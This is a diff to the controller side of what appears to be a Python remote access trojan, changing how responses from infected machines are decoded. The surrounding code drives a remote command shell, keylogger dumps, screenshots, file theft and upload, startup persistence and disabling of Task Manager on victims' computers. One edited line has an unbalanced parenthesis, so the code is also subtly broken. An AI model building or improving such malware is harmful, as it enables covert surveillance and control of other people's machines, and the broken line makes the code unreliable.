@@ -13,9 +13,6 @@ intPort = 3000
 
 intBuff = 1024
 
-# function to return decoded utf-8
-decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
-
 # function to return string with quotes removed
 remove_quotes = lambda string: string.replace("\"", "")
 
@@ -61,13 +58,23 @@ def socket_accept():
         try:
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
-            address += tuple(json.loads(decode_utf8(conn.recv(intBuff))))
+            address += tuple(json.loads(conn.recv(intBuff).decode()))
             arrConnections.append(conn)
             arrAddresses.append(address)
             print(f"\nConnection has been established: {address[0]} ({address[2]})")
         except socket.error:
             print("Error accepting connections!")
             continue
+
+
+def _decode(data):
+    try:
+        return data.decode()
+    except UnicodeDecodeError:
+        try:
+            return data.decode('cp437')
+        except UnicodeDecodeError:
+            return data.decode(errors='replace')
 
 
 def menu_help():
@@ -204,7 +211,7 @@ def user_info():
 
 def screenshot():
     send(b"screen")
-    strScrnSize = decode_utf8(recv(intBuff))  # get screenshot size
+    strScrnSize = recv(intBuff).decode()  # get screenshot size
     print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
 
     intBuffer = int(strScrnSize)
@@ -222,7 +229,7 @@ def browse_files():
     send(b"filebrowser")
     print("\nDrives :")
 
-    strDrives = decode_utf8(recv(intBuff))
+    strDrives = (recv(intBuff).decode()
     print(f"{strDrives}\n")
 
     strDir = input("Directory: ")
@@ -233,14 +240,14 @@ def browse_files():
 
     send(strDir.encode())
 
-    strClientResponse = decode_utf8(recv(intBuff))  # get buffer size
+    strClientResponse = recv(intBuff).decode()  # get buffer size
 
     if strClientResponse == "Invalid Directory!":  # if the directory is invalid
         print(f"\n{strClientResponse}")
         return
 
     intBuffer = int(strClientResponse)
-    strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data
+    strClientResponse = recvall(intBuffer).decode()  # receive full data
 
     print(f"\n{strClientResponse}")
 
@@ -249,7 +256,7 @@ def startup():
     send(b"startup")
     print("Registering ...")
 
-    strClientResponse = decode_utf8(recv(intBuff))
+    strClientResponse = recv(intBuff).decode()
     if not strClientResponse == "success":
         print(strClientResponse)
 
@@ -258,7 +265,7 @@ def remove_from_startup():
     send(b"rmvstartup")
     print("Removing ...")
 
-    strClientResponse = decode_utf8(recv(intBuff))
+    strClientResponse = recv(intBuff).decode()
     if not strClientResponse == "success":
         print(strClientResponse)
 
@@ -283,7 +290,7 @@ def send_file():
 
     print(f"Total bytes sent: {os.path.getsize(strFile)}")
 
-    strClientResponse = decode_utf8(recv(intBuff))
+    strClientResponse = recv(intBuff).decode()
     print(strClientResponse)
 
 
@@ -295,7 +302,7 @@ def receive():
         return
 
     send(("recv" + strFile).encode())
-    strClientResponse = decode_utf8(recv(intBuff))
+    strClientResponse = recv(intBuff).decode()
 
     if strClientResponse == "Target file not found!":
         print(strClientResponse)
@@ -318,7 +325,7 @@ def receive():
 
 def command_shell():  # remote cmd shell
     send(b"cmd")
-    strDefault = f"\n{decode_utf8(recv(intBuff))}>"
+    strDefault = f"\n{_decode(recv(intBuff))}>"
     print(strDefault, end="")  # print default prompt
 
     while True:
@@ -333,8 +340,8 @@ def command_shell():  # remote cmd shell
 
         elif len(strCommand) > 0:
             send(strCommand.encode())
-            intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
-            strClientResponse = decode_utf8(recvall(intBuffer))
+            intBuffer = int(recv(intBuff).decode())  # receive buffer size
+            strClientResponse = _decode(recvall(intBuffer))
             print(strClientResponse, end="")  # print cmd output
         else:
             print(strDefault, end="")
@@ -359,38 +366,38 @@ def python_interpreter():
 
 def disable_taskmgr():
     send(b"dtaskmgr")
-    print(decode_utf8(recv(intBuff)))  # print response
+    print(recv(intBuff).decode())  # print response
 
 
 def keylogger(option):
     if option == "start":
         send(b"keystart")
-        if decode_utf8(recv(intBuff)) == "error":
+        if recv(intBuff) == b"error":
             print("Keylogger is already running.")
 
     elif option == "stop":
         send(b"keystop")
-        if decode_utf8(recv(intBuff)) == "error":
+        if recv(intBuff) == b"error":
             print("Keylogger is not running.")
 
     elif option == "dump":
         send(b"keydump")
-        intBuffer = decode_utf8(recv(intBuff))
+        intBuffer = recv(intBuff).decode()
 
         if intBuffer == "error":
             print("Keylogger is not running.")
         elif intBuffer == "error2":
             print("No logs.")
         else:
-            strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
+            strLogs = recvall(int(intBuffer)).decode(errors='replace')  # get all data
             print(f"\n{strLogs}")
 
 
 def send_command(command):
     send(("runcmd" + command).encode())
-    intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
+    intBuffer = int(recv(intBuff).decode())  # receive buffer size
 
-    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24 * '='}"
+    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{recvall(intBuffer).decode()}{24 * '='}"
 
     if os.path.isfile("command_log.txt"):
         strMode = "a"
